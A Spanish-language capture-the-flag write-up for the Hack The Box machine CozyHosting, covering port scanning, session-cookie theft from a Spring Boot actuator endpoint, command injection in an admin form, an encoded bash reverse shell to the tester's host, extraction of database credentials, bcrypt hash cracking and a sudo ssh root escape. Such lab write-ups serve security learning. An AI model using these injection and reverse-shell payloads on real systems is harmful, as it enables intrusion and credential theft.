---
layout: single
title: CozzyHosting
excerpt: CozzyHosting machine
date: 
classes: wide
header: '{"teaser:":"/assets/images/CozzyHosting.png"}'
categories:
  - ctf
  - hackthebox
tags:
  - xss
  - sqli
  - hash
---
![[CozyHosting.png]]
![](CozyHosting.png)
![](/assets/images/CozyHosting.png)
## Puertos
Se realiza un escaneo de puertos y servicios a la IP de la máquina usando nmap con el comando:
```sh
sudo nmap -sCV -vvv -A -T5 -p- 10.10.11.230
```
Se encuentran abiertos los puertos 22 y 80.
Se realiza un escaneo enfocado a estos puertos de nuevo con nmap:
```sh
sudo nmap -sCV -A -p22,80 10.10.11.230
```

**22/tcp open  ssh**     syn-ack ttl 63 **OpenSSH 8.9p1 Ubuntu 3ubuntu0.3** (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
	|   256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
	|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
**80/tcp open  http**    syn-ack ttl 63 **nginx 1.18.0** (**Ubuntu**)
	|http-title: Cozy Hosting - Home
	|http-server-header: nginx/1.18.0 (Ubuntu)
	|http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
	|http-methods:
	|**Supported Methods: GET HEAD OPTIONS**

Encontramos información como la versión del ssh, el puerto 80 usa nginx

## Puerto 80
Se realiza un escaneo al puerto 80 usando "whatweb".
```sh
whatweb 10.10.11.230
```
La parte que interesa es:
RedirectLocation[**http://cozyhosting.htb**]
Por lo tanto hay que agregar la página al archivo "/etc/hosts" usando el comando:
```sh
sudo echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Al realizar fuzzing no se encontró información relevante.

Al visualizar el error 404 en una página errónea, la página muestra información útil.
![[Pasted image 20240628225207.png]]*This application has no explicit mapping for /error, so you are seeing this as a fallback.*
El texto de error, sirve para buscar información acerca del mismo en la web.

Se encuentra que el error está asociado a una tecnología llamada **spring boot**.

Conociendo la tecnología, se realiza un fuzzing más específico a la página usando wfuzz.
```sh
wfuzz -c --hc=403,404 -t 4 -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/FUZZ
```

Se encuentran varios subdirectorios:
"actuator/env", "actuator", "actuator/env/lang", "actuator/health", "actuator/env/path", "**actuator/sessions**", "actuator/mappings", "actuator/beans"
# Ganando acceso
## Reemplazo de cookie
Se accede a "actuator/sessions", en el que se encuentra información relevante de un usuario y su cookie de sessión:
![[Pasted image 20240628225239.png]]

Al entrar a la página cozyhosting.htb/login
Se presenta una página de inicio de sesión, al rellenar los campos de uduario y contraseña con cualquier texto y reemplazar la cookie de la página por la encontrada anteriormente de "kanderson", se recarga la página.
![[Pasted image 20240628225302.png]]

Esto permite el acceso a la página de administrador: cozihosting.htb/admin
En la cual, se encuentran dos campos, "Hostname" y "Username"
![[Pasted image 20240628225329.png]]

## Capturando la solicitud
Al rellenar la información con cualquier texto (partyhack en este caso), se procede a capturar el la request con burpsuite y posteriormente enviarla al repeater.
Luego de enviar la solicitud analizamos la respuesta del servidor y al parecer está ejecutando algo relacionado con ssh.
![[Pasted image 20240628225347.png]]
Intenta ejecutar el comando "ssh" usando como los datos proporcionados: partyhack en ambos casos.

## Probando PING
Teniendo esa información podemos intentar ejecutar comandos en el sistema, usando, en este caso un "ping" a nuestra máquina con reemplazando la línea 15 de la solicitud:
```sh
host=10.10.14.13&username=;ping${IFS}-c${IFS}4${IFS}10.10.14.13;
```

No sin antes haber ejejctado "tcpdump" para poner en escucha con el protocolo ICMP:
```sh
sudo tcpdump ip proto \\icmp -i tun0
```
Ya en escucha, a ejecutar el ping se debería recibirlo como a continuación:
![[Pasted image 20240628225405.png]]
## Ejecutando la reverse shell
Se pone en escucha a la máquina local usando netcat en el puerrto 4747 con lo siguiente:
```sh
rlwrap nc -lnvp 4747
```

Se reemplaza la línea con lo siguiente:
```sh
host=10.10.14.13&username=;echo${IFS%??}"YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ3NDcgMD4mMSAg"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```
Y se envía la solicitud, no sin antes aplicar un url-encode para asegurarse que no haya problemas al anviar los datos.

Si todo se realizó correctamente obtendremos la revershell como el usuario "app"
![[Pasted image 20240628225430.png]]

Los usuarios que son de interés son `josh` y `root`, por lo que lo tendremos en cuenta para después.
![[Pasted image 20240628225442.png]]
l listar los documentos podemos ver un archivo "cloudhosting-0.0.1.jar.jar" que podría contener información relevante.
Para traer ese archivo a nuestra máquina local. Desde la máquina en la que acabamos de ganar acceso montamos un servidor http con python:
```python
python3 -m http.server 4848
```

En nuestra máquina lo traemos con un wget.
```sh
wget 10.10.11.230:4848/cloudhosting-0.0.1.jar
```

Una vez el archivo esté en el directorio local, descomprimirlo con:
```sh
unzip cloudhosting-0.0.1.jar
```

Acceder a la carpeta /BOOT-INF/classes y leer el archivo "application.properties"
```sh
cat application.properties
```
Encontramos las siguientes credenciales, nombre de la base de datos  y que es una base de datos "postgresql".
spring.datasource.url=jdbc:**postgresql**://localhost:5432/**cozyhosting**
spring.datasource.username=**postgres**
spring.datasource.password=**Vg&nvzAQ7XxR**

Ingresamos a la base de datos con los siguientes datos e ingresamos la contraseña cuando se requiera.
```sh
psql -h 127.0.0.1 -U postgres -d cozyhosting
```

Listamos las tablas
![[Pasted image 20240628225507.png]]

Mostramos el contenido de las columnas de la tabla `user`
![[Pasted image 20240628225522.png]]

Teniendo los hashes de las contraseñas, podemos usar fuerza bruta para descifrar el de el usuario `admin` que nos interesa más. Para esto se puede usar `johntheripper`
```sh
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```
El tipo de hash es bcrypt.
![[Pasted image 20240628225543.png]]

ngresamos mediante `ssh` usando la contraseña y el usuario `josh`
```sh
ssh josh@10.10.11.230 -p22
```

Y obtenemos la flag de user:
![[Pasted image 20240628225553.png]]
# Escalada de privilegios
Probamos si ejecutar algún comando como root:
```sh
sudo -l
```

Y vemos que se podemos ejecutar ssh como root.
Por lo tanto escalamos privilegios usando ssh de la siguiente manera:
```sh
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
![[Pasted image 20240628225608.png]]